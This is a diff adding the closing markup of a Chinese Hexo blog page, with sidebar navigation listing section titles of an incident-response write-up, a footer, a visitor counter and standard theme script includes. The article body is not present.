+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/10/02/github信息搜集攻击面分析/" rel="next" title="github信息搜集攻击面分析">
+                <i class="fa fa-chevron-left"></i> github信息搜集攻击面分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">YoungRichOG</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#记一次攻防交叉的应急响应"><span class="nav-number">1.</span> <span class="nav-text">记一次攻防交叉的应急响应</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#描述"><span class="nav-number">1.1.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#流程"><span class="nav-number">1.2.</span> <span class="nav-text">流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Round-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">Round 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Round-3"><span class="nav-number">1.2.2.</span> <span class="nav-text">Round 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Round-4"><span class="nav-number">1.2.3.</span> <span class="nav-text">Round 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Round-5"><span class="nav-number">1.2.4.</span> <span class="nav-text">Round 5</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令"><span class="nav-number">1.3.</span> <span class="nav-text">命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#感悟"><span class="nav-number">1.4.</span> <span class="nav-text">感悟</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">YoungRichOG</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv"><br>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
